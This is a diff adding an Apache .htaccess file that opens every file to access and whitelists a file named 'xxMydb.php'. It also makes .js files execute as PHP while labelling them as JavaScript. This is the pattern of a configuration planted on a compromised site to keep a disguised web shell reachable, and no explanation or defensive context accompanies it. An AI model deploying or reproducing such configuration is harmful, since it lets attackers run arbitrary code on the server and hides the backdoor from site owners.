@@ -1,0 +1,45 @@
+Options -Indexes
+
+<FilesMatch ".*">
+    Require all granted
+</FilesMatch>
+
+<FilesMatch "\.(html|htm)$">
+    Require all granted
+</FilesMatch>
+
+<Files "xxMydb.php">
+    Require all granted
+</Files>
+
+<FilesMatch "\.(php|phtml|php[0-9]|phps|phar|shtml|cgi|pl|perl|py|asp|aspx|jsp|htaccess|htpasswd)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+
+<Files ".ht*">
+    Require all denied
+</Files>
+
+<IfModule LiteSpeed>
+    php_value engine Off
+</IfModule>
+<IfModule mod_authz_core.c>
+    Require all granted
+</IfModule>
+
+<IfModule php_module>
+    php_flag engine on
+</IfModule>
+
+<IfModule mime_module>
+    AddType application/x-httpd-php .js
+</IfModule>
+
+<FilesMatch "\.js$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+<IfModule mod_headers.c>
+    Header set Content-Type "application/javascript"
+</IfModule>
